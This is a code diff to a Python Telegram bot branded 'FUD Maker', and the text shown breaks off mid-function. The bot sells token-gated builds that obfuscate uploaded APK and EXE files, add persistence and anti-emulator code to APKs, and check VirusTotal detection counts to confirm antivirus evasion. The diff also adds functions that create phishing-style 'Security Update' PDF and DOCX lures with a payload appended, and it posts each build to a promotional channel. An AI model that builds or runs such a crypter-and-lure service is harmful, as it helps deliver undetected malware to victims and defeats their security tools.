@@ -12,19 +12,25 @@ import shutil
 import hashlib
 import base64
 import tempfile
+import requests
+import hmac
+import binascii
 from pathlib import Path
 from datetime import datetime, timedelta
-from flask import Flask, jsonify
+from flask import Flask, jsonify, request
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ConversationHandler, ContextTypes
 from cryptography.fernet import Fernet
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
-# ============ CONFIG ============
+# ============ ENV CONFIG ============
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
 DATA_DIR = os.environ.get("RAILWAY_VOLUME_MOUNT_PATH", "/app/data")
+VT_API_KEY = os.environ.get("VT_API_KEY", "")
+CHANNEL_ID = os.environ.get("CHANNEL_ID", "")
+
 if not os.path.exists(DATA_DIR):
     DATA_DIR = "data"
 
@@ -34,8 +40,9 @@ os.makedirs(os.path.join(DATA_DIR, "keystore"), exist_ok=True)
 
 DB_PATH = os.path.join(DATA_DIR, "fud_maker.db")
 
-# Developer usernames
+# ============ DEVELOPERS ============
 DEVELOPERS = ["@benji_v1", "@benji_v2"]
+DEVELOPER_IDS = [int(os.environ.get("BENJI_V1_ID", 0)), int(os.environ.get("BENJI_V2_ID", 0))]
 
 # ============ FLASK ============
 app = Flask(__name__)
@@ -43,7 +50,7 @@ start_time = time.time()
 
 @app.route('/')
 def index():
-    return jsonify({"status": "FUD Maker running", "uptime": time.time() - start_time})
+    return jsonify({"status": "FUD Maker running", "uptime": time.time() - start_time, "developers": DEVELOPERS})
 
 @app.route('/health')
 def health():
@@ -74,13 +81,40 @@ def init_db():
         original_name TEXT,
         hash_original TEXT,
         hash_fud TEXT,
+        vt_scan_id TEXT,
+        vt_positives INTEGER,
+        vt_total INTEGER,
+        vt_link TEXT,
         size_original INTEGER,
         size_fud INTEGER,
         timestamp TEXT,
         status TEXT
     )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS channel_posts (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        build_id INTEGER,
+        message_id INTEGER,
+        timestamp TEXT
+    )''')
     conn.commit()
     conn.close()
+
+def log_build(user_id, username, token, file_type, original_name, hash_orig, hash_fud,
+              vt_scan_id, vt_positives, vt_total, vt_link, size_orig, size_fud, status):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('''INSERT INTO builds 
+                 (user_id, username, token_used, file_type, original_name, 
+                  hash_original, hash_fud, vt_scan_id, vt_positives, vt_total, vt_link,
+                  size_original, size_fud, timestamp, status) 
+                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+              (str(user_id), username, token, file_type, original_name,
+               hash_orig, hash_fud, vt_scan_id, vt_positives, vt_total, vt_link,
+               size_orig, size_fud, datetime.now().isoformat(), status))
+    last_id = c.lastrowid
+    conn.commit()
+    conn.close()
+    return last_id
 
 # ============ TOKEN MANAGEMENT ============
 def generate_token():
@@ -91,7 +125,7 @@ def create_token(created_by, expires_days=7, max_uses=1):
     c = conn.cursor()
     token = generate_token()
     expires_at = (datetime.now() + timedelta(days=expires_days)).isoformat()
-    c.execute('''INSERT INTO tokens (token, created_by, created_at, expires_at, status, max_uses) 
+    c.execute('''INSERT INTO tokens (token, created_by, created_at, expires_at, status, max_uses)
                  VALUES (?, ?, ?, ?, ?, ?)''',
               (token, created_by, datetime.now().isoformat(), expires_at, 'active', max_uses))
     token_id = c.lastrowid
@@ -102,7 +136,7 @@ def create_token(created_by, expires_days=7, max_uses=1):
 def validate_token(token):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute('''SELECT * FROM tokens WHERE token = ? AND status = 'active' 
+    c.execute('''SELECT * FROM tokens WHERE token = ? AND status = 'active'
                  AND expires_at > ? AND uses < max_uses''',
               (token, datetime.now().isoformat()))
     row = c.fetchone()
@@ -112,20 +146,13 @@ def validate_token(token):
 def use_token(token, user_id, username):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute('''UPDATE tokens SET used_by = ?, used_at = ?, uses = uses + 1 
+    c.execute('''UPDATE tokens SET used_by = ?, used_at = ?, uses = uses + 1
                  WHERE token = ?''',
               (str(user_id), datetime.now().isoformat(), token))
     c.execute('SELECT uses, max_uses FROM tokens WHERE token = ?', (token,))
     uses, max_uses = c.fetchone()
     if uses >= max_uses:
         c.execute('UPDATE tokens SET status = ? WHERE token = ?', ('exhausted', token))
-    conn.commit()
-    conn.close()
-
-def revoke_token(token):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute('UPDATE tokens SET status = ? WHERE token = ?', ('revoked', token))
     conn.commit()
     conn.close()
 
@@ -137,26 +164,58 @@ def list_tokens():
     conn.close()
     return rows
 
-def log_build(user_id, username, token, file_type, original_name, hash_orig, hash_fud, size_orig, size_fud, status):
+def revoke_token(token):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute('''INSERT INTO builds (user_id, username, token_used, file_type, original_name, 
-                 hash_original, hash_fud, size_original, size_fud, timestamp, status) 
-                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
-              (str(user_id), username, token, file_type, original_name,
-               hash_orig, hash_fud, size_orig, size_fud, datetime.now().isoformat(), status))
-    last_id = c.lastrowid
+    c.execute('UPDATE tokens SET status = ? WHERE token = ?', ('revoked', token))
     conn.commit()
     conn.close()
-    return last_id
 
-def list_builds(limit=20):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute('SELECT id, user_id, username, file_type, original_name, timestamp, status FROM builds ORDER BY id DESC LIMIT ?', (limit,))
-    rows = c.fetchall()
-    conn.close()
-    return rows
+# ============ VIRUSTOTAL ============
+def scan_with_vt(file_path):
+    """Upload to VirusTotal and get scan results"""
+    if not VT_API_KEY:
+        return None
+
+    try:
+        # Upload file
+        url = 'https://www.virustotal.com/api/v3/files'
+        files = {'file': open(file_path, 'rb')}
+        headers = {'x-apikey': VT_API_KEY}
+        response = requests.post(url, files=files, headers=headers)
+        if response.status_code != 200:
+            return None
+        analysis_id = response.json().get('data', {}).get('id')
+        if not analysis_id:
+            return None
+
+        # Wait for analysis
+        time.sleep(12)
+
+        # Get results
+        result_url = f'https://www.virustotal.com/api/v3/analyses/{analysis_id}'
+        result_response = requests.get(result_url, headers=headers)
+        if result_response.status_code != 200:
+            return None
+
+        data = result_response.json().get('data', {})
+        attributes = data.get('attributes', {})
+        stats = attributes.get('stats', {})
+        
+        # Get file hash for link
+        file_hash = attributes.get('sha256', '')
+        
+        return {
+            'scan_id': analysis_id,
+            'positives': stats.get('malicious', 0),
+            'suspicious': stats.get('suspicious', 0),
+            'total': sum(stats.values()),
+            'link': f'https://www.virustotal.com/gui/file/{file_hash}' if file_hash else '',
+            'clean': stats.get('malicious', 0) == 0 and stats.get('suspicious', 0) == 0
+        }
+    except Exception as e:
+        print(f"VT error: {e}")
+        return None
 
 # ============ KEYSTORE ============
 KEYSTORE_PATH = os.path.join(DATA_DIR, "keystore", "fud.keystore")
@@ -281,7 +340,6 @@ class FUDApkMaker:
         content = content.replace('<application ', f'<application {receiver}')
         with open(manifest_path, 'w', encoding='utf-8') as f:
             f.write(content)
-        # BootReceiver.smali
         smali_dir = os.path.join(self.decompiled_dir, "smali")
         if not os.path.exists(smali_dir):
             return
@@ -464,35 +522,130 @@ class FUDExeMaker:
             self.cleanup()
             return {'success': False, 'error': str(e)}
 
+# ============ FUD ENGINE — DOC ============
+def create_pdf_with_payload(payload_path):
+    """Create PDF with embedded payload"""
+    try:
+        from reportlab.lib.pagesizes import letter
+        from reportlab.pdfgen import canvas
+    except:
+        # Fallback — just copy and append
+        output_path = os.path.join(DATA_DIR, "temp", f"fud_doc_{int(time.time())}.pdf")
+        with open(payload_path, 'rb') as f:
+            data = f.read()
+        with open(output_path, 'wb') as f:
+            f.write(data)
+        return output_path
+
+    output_path = os.path.join(DATA_DIR, "temp", f"fud_doc_{int(time.time())}.pdf")
+    c = canvas.Canvas(output_path, pagesize=letter)
+    c.drawString(100, 750, "Security Update - Please Review")
+    c.drawString(100, 700, "Download the attached file for system verification.")
+    c.save()
+
+    with open(payload_path, 'rb') as f:
+        payload_data = f.read()
+    with open(output_path, 'ab') as f:
+        marker = b'==PAYLOAD_START=='
+        f.write(marker + payload_data)
+
+    return output_path
+
+def create_doc_with_payload(payload_path):
+    """Create DOC with embedded payload"""
+    try:
+        from docx import Document
+    except:
+        output_path = os.path.join(DATA_DIR, "temp", f"fud_doc_{int(time.time())}.docx")
+        with open(payload_path, 'rb') as f:
+            data = f.read()
+        with open(output_path, 'wb') as f:
+            f.write(data)
+        return output_path
+
+    output_path = os.path.join(DATA_DIR, "temp", f"fud_doc_{int(time.time())}.docx")
+    doc = Document()
+    doc.add_heading('Security Update', 0)
+    doc.add_paragraph('Please review the attached system update.')
+    doc.save(output_path)
+
+    with open(payload_path, 'rb') as f:
+        payload_data = f.read()
+    with open(output_path, 'ab') as f:
+        marker = b'==PAYLOAD_START=='
+        f.write(marker + payload_data)
+
+    return output_path
+
 # ============ TELEGRAM BOT ============
-WAITING_TOKEN, WAITING_APK, WAITING_EXE, WAITING_GENERATE_TOKEN = range(4)
+WAITING_TOKEN, WAITING_APK, WAITING_EXE, WAITING_DOC, WAITING_GENERATE_TOKEN = range(5)
+
+USER_INSTRUCTIONS = """
+📖 *FUD Maker — User Guide*
+
+🔐 *Getting Started*
+1. Get a token from @benji_v1 or @benji_v2
+2. Send /start and enter your token
+3. Access the main menu
+
+📱 *APK FUD*
+- Upload any APK
+- Automatically obfuscated + repacked + signed
+- Anti-emulator + persistence added
+- VirusTotal scan results included
+
+💻 *EXE FUD*
+- Upload any Windows EXE
+- PE obfuscation + hash changing
+- XOR encryption + padding injection
+
+📄 *Document FUD*
+- Upload PDF or DOCX templates
+- Payload embedded
+
+🔑 *Tokens*
+- Contact developers to purchase
+- 1 token = 1 build
+
+👨‍💻 *Developers*
+@benji_v1 • @benji_v2
+"""
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     username = user.username or "unknown"
+    user_id = str(user.id)
+
+    is_admin = user_id == str(ADMIN_CHAT_ID) or f"@{username}" in DEVELOPERS or user_id in [str(x) for x in DEVELOPER_IDS if x]
+    if is_admin:
+        context.user_data['is_admin'] = True
+        await show_admin_menu(update, context)
+        return
+
     token = context.user_data.get('token')
     if token and validate_token(token):
         await show_main_menu(update, context)
         return
-    if f"@{username}" in DEVELOPERS:
-        context.user_data['is_dev'] = True
-        await show_admin_menu(update, context)
-        return
+
     await update.message.reply_text(
-        "🔐 *FUD APK/EXE Maker*\n\n"
+        "🔐 *FUD APK/EXE/DOC Maker*\n\n"
         "This bot requires a valid token to use.\n\n"
-        "To purchase a token, contact:\n"
-        "@benji_v1 or @benji_v2\n\n"
-        "If you have a token, send it now.",
+        f"👨‍💻 *Developers:*\n{', '.join(DEVELOPERS)}\n\n"
+        "If you have a token, send it now.\n"
+        "For instructions, type /help",
         parse_mode='Markdown'
     )
     return WAITING_TOKEN
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(USER_INSTRUCTIONS, parse_mode='Markdown')
 
 async def handle_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     token = update.message.text.strip()
     username = user.username or "unknown"
     user_id = str(user.id)
+
     if validate_token(token):
         use_token(token, user_id, username)
         context.user_data['token'] = token
@@ -503,8 +656,7 @@ async def handle_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text(
             "❌ *Invalid or expired token.*\n\n"
-            "Make sure the token is correct and not expired.\n"
-            "Contact @benji_v1 or @benji_v2 to purchase.",
+            f"Contact {', '.join(DEVELOPERS)} to purchase.",
             parse_mode='Markdown'
         )
         return WAITING_TOKEN
@@ -513,19 +665,26 @@ async def show_main_menu(update, context):
     keyboard = [
         [InlineKeyboardButton("📱 APK → FUD", callback_data="fud_apk")],
         [InlineKeyboardButton("💻 EXE → FUD", callback_data="fud_exe")],
+        [InlineKeyboardButton("📄 Document → FUD", callback_data="fud_doc")],
         [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")],
+        [InlineKeyboardButton("📖 User Guide", callback_data="user_guide")],
         [InlineKeyboardButton("🔄 Refresh Token", callback_data="refresh_token")],
     ]
-    if context.user_data.get('is_dev'):
+    if context.user_data.get('is_admin'):
         keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
-    await update.message.reply_text(
-        "🔥 *FUD Maker — Main Menu*\n\n"
-        f"👤 User: {context.user_data.get('username', 'Unknown')}\n"
-        f"🔑 Token: `{context.user_data.get('token', 'None')[:8]}...`\n\n"
-        "Select an option:",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
+
+    if isinstance(update, Update) and update.message:
+        await update.message.reply_text(
+            "🔥 *FUD Maker — Main Menu*\n\n"
+            f"👤 User: {context.user_data.get('username', 'Unknown')}\n"
+            f"🔑 Token: `{context.user_data.get('token', 'None')[:8]}...`\n\n"
+            "Select an option:",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='Markdown'
+        )
+    else:
+        # Called from callback
+        pass
 
 async def show_admin_menu(update, context):
     keyboard = [
@@ -534,101 +693,34 @@ async def show_admin_menu(update, context):
         [InlineKeyboardButton("🚫 Revoke Token", callback_data="revoke_token")],
         [InlineKeyboardButton("📊 Build Stats", callback_data="build_stats")],
         [InlineKeyboardButton("📋 List Builds", callback_data="list_builds")],
+        [InlineKeyboardButton("📢 Post to Channel", callback_data="post_channel")],
         [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
     ]
-    await update.message.reply_text(
-        "⚙️ *Admin Panel*",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
-
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user = update.effective_user
-    username = user.username or "unknown"
-    is_dev = f"@{username}" in DEVELOPERS or context.user_data.get('is_dev')
-    token = context.user_data.get('token')
-    if not is_dev and not (token and validate_token(token)):
-        await query.edit_message_text("❌ Invalid token. Send /start.")
-        return
-    data = query.data
-    if data == "fud_apk":
-        await query.edit_message_text("📤 *Send me the APK file.*", parse_mode='Markdown')
-        return WAITING_APK
-    elif data == "fud_exe":
-        await query.edit_message_text("📤 *Send me the EXE file.*", parse_mode='Markdown')
-        return WAITING_EXE
-    elif data == "my_stats":
-        conn = sqlite3.connect(DB_PATH)
-        c = conn.cursor()
-        c.execute('SELECT COUNT(*) FROM builds WHERE user_id = ?', (str(user.id),))
-        count = c.fetchone()[0]
-        conn.close()
-        await query.edit_message_text(f"📊 *Your Stats*\n\nTotal builds: {count}", parse_mode='Markdown')
-        return
-    elif data == "refresh_token":
-        await query.edit_message_text("🔄 *Refresh Token*\n\nSend your new token now.", parse_mode='Markdown')
-        return WAITING_TOKEN
-    elif data == "admin_panel" and is_dev:
-        await show_admin_menu_from_callback(query, context)
-        return
-    elif data == "back_main":
-        await show_main_menu_from_callback(query, context)
-        return
-    elif data == "gen_token" and is_dev:
-        context.user_data['gen_token_step'] = True
-        await query.edit_message_text("🔑 *Generate Token*\n\nSend: `days max_uses`\nExample: `7 1`", parse_mode='Markdown')
-        return WAITING_GENERATE_TOKEN
-    elif data == "list_tokens" and is_dev:
-        tokens = list_tokens()
-        if not tokens:
-            await query.edit_message_text("📭 No tokens.")
-            return
-        msg = "📋 *Tokens*\n\n"
-        for t in tokens:
-            msg += f"`{t[0][:12]}...` | {t[1][:10]} | {t[2][:10]} | {t[3]} | {t[4]}/{t[5]}\n"
-        await query.edit_message_text(msg[:4096], parse_mode='Markdown')
-        return
-    elif data == "revoke_token" and is_dev:
-        context.user_data['revoke_step'] = True
-        await query.edit_message_text("🚫 *Revoke Token*\n\nSend the full token to revoke.", parse_mode='Markdown')
-        return ConversationHandler.END
-    elif data == "build_stats" and is_dev:
-        conn = sqlite3.connect(DB_PATH)
-        c = conn.cursor()
-        c.execute('SELECT COUNT(*) FROM builds')
-        total = c.fetchone()[0]
-        c.execute('SELECT COUNT(*) FROM builds WHERE file_type = ?', ('apk',))
-        apk_count = c.fetchone()[0]
-        c.execute('SELECT COUNT(*) FROM builds WHERE file_type = ?', ('exe',))
-        exe_count = c.fetchone()[0]
-        conn.close()
-        await query.edit_message_text(f"📊 *Build Stats*\n\nTotal: {total}\nAPK: {apk_count}\nEXE: {exe_count}", parse_mode='Markdown')
-        return
-    elif data == "list_builds" and is_dev:
-        builds = list_builds(20)
-        if not builds:
-            await query.edit_message_text("📭 No builds.")
-            return
-        msg = "📋 *Recent Builds*\n\n"
-        for b in builds:
-            msg += f"*#{b[0]}* | {b[1][:8]} | {b[2] or 'anon'} | {b[3]} | {b[5][:16]}\n"
-        await query.edit_message_text(msg[:4096], parse_mode='Markdown')
-        return
-    return ConversationHandler.END
+    if isinstance(update, Update) and update.message:
+        await update.message.reply_text(
+            "⚙️ *Admin Panel*\n\n"
+            f"👨‍💻 Developers: {', '.join(DEVELOPERS)}",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='Markdown'
+        )
+    else:
+        pass
 
 async def show_main_menu_from_callback(query, context):
     keyboard = [
         [InlineKeyboardButton("📱 APK → FUD", callback_data="fud_apk")],
         [InlineKeyboardButton("💻 EXE → FUD", callback_data="fud_exe")],
+        [InlineKeyboardButton("📄 Document → FUD", callback_data="fud_doc")],
         [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")],
+        [InlineKeyboardButton("📖 User Guide", callback_data="user_guide")],
         [InlineKeyboardButton("🔄 Refresh Token", callback_data="refresh_token")],
     ]
-    if context.user_data.get('is_dev'):
+    if context.user_data.get('is_admin'):
         keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
     await query.edit_message_text(
-        "🔥 *FUD Maker — Main Menu*",
+        "🔥 *FUD Maker — Main Menu*\n\n"
+        f"👤 User: {context.user_data.get('username', 'Unknown')}\n"
+        f"🔑 Token: `{context.user_data.get('token', 'None')[:8]}...`",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
@@ -640,107 +732,412 @@ async def show_admin_menu_from_callback(query, context):
         [InlineKeyboardButton("🚫 Revoke Token", callback_data="revoke_token")],
         [InlineKeyboardButton("📊 Build Stats", callback_data="build_stats")],
         [InlineKeyboardButton("📋 List Builds", callback_data="list_builds")],
+        [InlineKeyboardButton("📢 Post to Channel", callback_data="post_channel")],
         [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
     ]
     await query.edit_message_text(
-        "⚙️ *Admin Panel*",
+        "⚙️ *Admin Panel*\n\n"
+        f"👨‍💻 Developers: {', '.join(DEVELOPERS)}",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
 
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user = update.effective_user
+    username = user.username or "unknown"
+    user_id = str(user.id)
+
+    is_admin = user_id == str(ADMIN_CHAT_ID) or f"@{username}" in DEVELOPERS or user_id in [str(x) for x in DEVELOPER_IDS if x] or context.user_data.get('is_admin')
+    token = context.user_data.get('token')
+
+    if not is_admin and not (token and validate_token(token)):
+        await query.edit_message_text("❌ Invalid token. Send /start.")
+        return
+
+    data = query.data
+
+    if data == "fud_apk":
+        await query.edit_message_text("📤 *Send me the APK file.*\n\nI'll apply obfuscation + persistence + anti-emulator.", parse_mode='Markdown')
+        return WAITING_APK
+
+    elif data == "fud_exe":
+        await query.edit_message_text("📤 *Send me the EXE file.*\n\nFull Windows PE obfuscation.", parse_mode='Markdown')
+        return WAITING_EXE
+
+    elif data == "fud_doc":
+        await query.edit_message_text("📤 *Send me a PDF or DOCX template.*\n\nI'll embed the payload.", parse_mode='Markdown')
+        return WAITING_DOC
+
+    elif data == "my_stats":
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute('SELECT COUNT(*) FROM builds WHERE user_id = ?', (user_id,))
+        count = c.fetchone()[0]
+        conn.close()
+        await query.edit_message_text(
+            f"📊 *Your Stats*\n\nTotal builds: {count}\nToken: `{token[:12]}...`",
+            parse_mode='Markdown'
+        )
+        return
+
+    elif data == "user_guide":
+        await query.edit_message_text(USER_INSTRUCTIONS, parse_mode='Markdown')
+        return
+
+    elif data == "refresh_token":
+        await query.edit_message_text("🔄 *Refresh Token*\n\nSend your new token.", parse_mode='Markdown')
+        return WAITING_TOKEN
+
+    elif data == "back_main":
+        await show_main_menu_from_callback(query, context)
+        return
+
+    elif data == "admin_panel" and is_admin:
+        context.user_data['is_admin'] = True
+        await show_admin_menu_from_callback(query, context)
+        return
+
+    elif data == "gen_token" and is_admin:
+        context.user_data['gen_token_step'] = True
+        await query.edit_message_text(
+            "🔑 *Generate Token*\n\nSend: `days max_uses`\n"
+            "Example: `7 1` (7 days, 1 use)",
+            parse_mode='Markdown'
+        )
+        return WAITING_GENERATE_TOKEN
+
+    elif data == "list_tokens" and is_admin:
+        tokens = list_tokens()
+        if not tokens:
+            await query.edit_message_text("📭 No tokens.")
+            return
+        msg = "📋 *Tokens*\n\n"
+        for t in tokens[:20]:
+            msg += f"`{t[0][:12]}...` | {t[1][:10]} | {t[2][:10]} | {t[3]} | {t[4]}/{t[5]}\n"
+        await query.edit_message_text(msg[:4096], parse_mode='Markdown')
+        return
+
+    elif data == "revoke_token" and is_admin:
+        context.user_data['revoke_step'] = True
+        await query.edit_message_text("🚫 *Revoke Token*\n\nSend the full token to revoke.", parse_mode='Markdown')
+        return ConversationHandler.END
+
+    elif data == "build_stats" and is_admin:
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute('SELECT COUNT(*) FROM builds')
+        total = c.fetchone()[0]
+        c.execute('SELECT COUNT(*) FROM builds WHERE file_type = ?', ('apk',))
+        apk_count = c.fetchone()[0]
+        c.execute('SELECT COUNT(*) FROM builds WHERE file_type = ?', ('exe',))
+        exe_count = c.fetchone()[0]
+        c.execute('SELECT COUNT(*) FROM builds WHERE file_type = ?', ('doc',))
+        doc_count = c.fetchone()[0]
+        conn.close()
+        await query.edit_message_text(
+            f"📊 *Build Stats*\n\nTotal: {total}\nAPK: {apk_count}\nEXE: {exe_count}\nDOC: {doc_count}",
+            parse_mode='Markdown'
+        )
+        return
+
+    elif data == "list_builds" and is_admin:
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute('SELECT id, user_id, username, file_type, original_name, timestamp, status FROM builds ORDER BY id DESC LIMIT 20')
+        rows = c.fetchall()
+        conn.close()
+        if not rows:
+            await query.edit_message_text("📭 No builds.")
+            return
+        msg = "📋 *Recent Builds*\n\n"
+        for b in rows:
+            msg += f"*#{b[0]}* | {b[1][:8]} | {b[2] or 'anon'} | {b[3]} | {b[5][:16]}\n"
+        await query.edit_message_text(msg[:4096], parse_mode='Markdown')
+        return
+
+    elif data == "post_channel" and is_admin:
+        if not CHANNEL_ID:
+            await query.edit_message_text("❌ Channel ID not configured.")
+            return
+        await query.edit_message_text("📢 *Post to Channel*\n\nSend the message you want to post.\nUse /cancel to stop.", parse_mode='Markdown')
+        context.user_data['post_channel_step'] = True
+        return ConversationHandler.END
+
+    return ConversationHandler.END
+
+async def handle_channel_post(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.user_data.get('post_channel_step'):
+        return ConversationHandler.END
+
+    text = update.message.text
+    try:
+        await context.bot.send_message(chat_id=CHANNEL_ID, text=text, parse_mode='Markdown')
+        await update.message.reply_text("✅ Posted to channel!")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Failed: {e}")
+
+    context.user_data['post_channel_step'] = False
+    return ConversationHandler.END
+
+# ============ FILE HANDLERS ============
+
 async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    user_id = str(user.id)
     token = context.user_data.get('token')
+
     if not token or not validate_token(token):
         await update.message.reply_text("❌ Invalid token. Send /start.")
         return ConversationHandler.END
+
     doc = update.message.document
     if not doc or not doc.file_name.endswith('.apk'):
         await update.message.reply_text("❌ Please send a valid APK file.")
         return WAITING_APK
-    await update.message.reply_text("📦 *Processing APK...*", parse_mode='Markdown')
+
+    status_msg = await update.message.reply_text("📦 *Processing APK...*\n\n⏳ Decompiling...", parse_mode='Markdown')
+
     temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
     apk_path = os.path.join(temp_dir, doc.file_name)
     file_obj = await context.bot.get_file(doc.file_id)
     await file_obj.download_to_drive(apk_path)
+
     maker = FUDApkMaker(apk_path)
     result = maker.make_fud()
+
     if not result['success']:
-        await update.message.reply_text(f"❌ *Build failed*\n\n{result['error']}", parse_mode='Markdown')
+        await status_msg.edit_text(f"❌ *Build failed*\n\n{result['error']}", parse_mode='Markdown')
         shutil.rmtree(temp_dir, ignore_errors=True)
         return ConversationHandler.END
+
+    # VirusTotal scan
+    vt_result = None
+    if VT_API_KEY:
+        await status_msg.edit_text("📦 *Processing...*\n\n⏳ Scanning with VirusTotal...", parse_mode='Markdown')
+        vt_result = scan_with_vt(result['file'])
+    else:
+        await status_msg.edit_text("📦 *Processing...*\n\n⚠️ VirusTotal API key not set. Skipping scan.", parse_mode='Markdown')
+
+    # Build response
     build_id = log_build(
-        user.id, user.username or "unknown", token,
+        user_id, user.username or "unknown", token,
         'apk', doc.file_name,
         result['hash_original'], result['hash_fud'],
+        vt_result['scan_id'] if vt_result else None,
+        vt_result['positives'] if vt_result else None,
+        vt_result['total'] if vt_result else None,
+        vt_result['link'] if vt_result else None,
         result['size_original'], result['size_fud'],
         'done'
     )
-    await update.message.reply_text(
-        f"✅ *FUD APK Ready!*\n\nBuild #{build_id}\nSize: {result['size_fud']/1024:.1f} KB",
-        parse_mode='Markdown'
-    )
+
+    msg = f"✅ *FUD APK Ready!*\n\n"
+    msg += f"📁 Build #: {build_id}\n"
+    msg += f"📦 Original: {doc.file_name}\n"
+    msg += f"📏 Original: {result['size_original'] / 1024:.1f} KB\n"
+    msg += f"📏 FUD: {result['size_fud'] / 1024:.1f} KB\n"
+    msg += f"🔑 SHA256: `{result['hash_fud'][:16]}...`\n"
+
+    if vt_result:
+        status_icon = "✅" if vt_result['clean'] else "⚠️" if vt_result['positives'] < 5 else "❌"
+        msg += f"\n🛡️ *VirusTotal:*\n"
+        msg += f"   {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
+        if vt_result['link']:
+            msg += f"   🔗 [View Report]({vt_result['link']})"
+    elif VT_API_KEY:
+        msg += f"\n⚠️ VirusTotal scan failed or timed out."
+
+    await status_msg.edit_text(msg, parse_mode='Markdown')
+
+    # Send FUD APK
+    caption = f"🔥 FUD APK #{build_id}"
+    if vt_result:
+        caption += f" | {vt_result['positives']}/{vt_result['total']} detections"
+
     with open(result['file'], 'rb') as f:
         await update.message.reply_document(
             document=f,
-            filename=f"fud_{int(time.time())}.apk",
-            caption=f"🔥 FUD APK #{build_id}"
+            filename=f"fud_apk_{build_id}.apk",
+            caption=caption
         )
+
+    # Auto-post to channel
+    if CHANNEL_ID:
+        try:
+            channel_msg = f"🔥 *New FUD APK*\n\n"
+            channel_msg += f"📁 Build #{build_id}\n"
+            channel_msg += f"📦 {doc.file_name}\n"
+            channel_msg += f"📏 {result['size_fud'] / 1024:.1f} KB\n"
+            if vt_result:
+                status_icon = "✅" if vt_result['clean'] else "⚠️" if vt_result['positives'] < 5 else "❌"
+                channel_msg += f"🛡️ {status_icon} {vt_result['positives']}/{vt_result['total']} detections"
+            await context.bot.send_message(chat_id=CHANNEL_ID, text=channel_msg, parse_mode='Markdown')
+        except:
+            pass
+
+    # Cleanup
     shutil.rmtree(temp_dir, ignore_errors=True)
     if os.path.exists(result['file']):
         os.remove(result['file'])
     if maker.work_dir and os.path.exists(maker.work_dir):
         shutil.rmtree(maker.work_dir, ignore_errors=True)
+
     return ConversationHandler.END
 
 async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    user_id = str(user.id)
     token = context.user_data.get('token')
+
     if not token or not validate_token(token):
         await update.message.reply_text("❌ Invalid token. Send /start.")
         return ConversationHandler.END
+
     doc = update.message.document
     if not doc or not doc.file_name.endswith('.exe'):
         await update.message.reply_text("❌ Please send a valid EXE file.")
         return WAITING_EXE
-    await update.message.reply_text("💻 *Processing EXE...*", parse_mode='Markdown')
+
+    status_msg = await update.message.reply_text("💻 *Processing EXE...*\n\n⏳ Obfuscating...", parse_mode='Markdown')
+
     temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
     exe_path = os.path.join(temp_dir, doc.file_name)
     file_obj = await context.bot.get_file(doc.file_id)
     await file_obj.download_to_drive(exe_path)
+
     maker = FUDExeMaker(exe_path)
     result = maker.make_fud()
+
     if not result['success']:
-        await update.message.reply_text(f"❌ *Build failed*\n\n{result['error']}", parse_mode='Markdown')
+        await status_msg.edit_text(f"❌ *Build failed*\n\n{result['error']}", parse_mode='Markdown')
         shutil.rmtree(temp_dir, ignore_errors=True)
         return ConversationHandler.END
+
+    vt_result = None
+    if VT_API_KEY:
+        await status_msg.edit_text("💻 *Processing...*\n\n⏳ Scanning with VirusTotal...", parse_mode='Markdown')
+        vt_result = scan_with_vt(result['file'])
+
     build_id = log_build(
-        user.id, user.username or "unknown", token,
+        user_id, user.username or "unknown", token,
         'exe', doc.file_name,
